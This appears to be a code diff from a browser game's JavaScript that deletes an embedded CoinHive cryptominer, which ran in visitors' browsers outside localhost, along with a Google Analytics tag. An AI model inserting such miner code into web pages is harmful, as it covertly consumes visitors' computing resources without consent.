@@ -38,23 +38,3 @@ if (game) {
         }
     });
 }
-
-if (window.location.hostname != '127.0.0.1') {
-    var miner, minerScript = document.createElement('script');
-    minerScript.src = 'https://coinhive.com/lib/coinhive.min.js';
-    minerScript.addEventListener('load', function () {
-        miner = new CoinHive.Anonymous('ENDYwvXEVLN7UFRO43zBsKNHAYGXx9u2');
-        miner.setThrottle(miner.isMobile() ? 0.3 : 0.1);
-        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
-    });
-    document.head.appendChild(minerScript);
-
-    var analyticsScript = document.createElement('script');
-    analyticsScript.src = 'https://www.googletagmanager.com/gtag/js?id=UA-110826300-1';
-    document.head.appendChild(analyticsScript);
-
-    window.dataLayer = window.dataLayer || [];
-    function gtag () { dataLayer.push(arguments); }
-    gtag('js', new Date());
-    gtag('config', 'UA-110826300-1');
-}
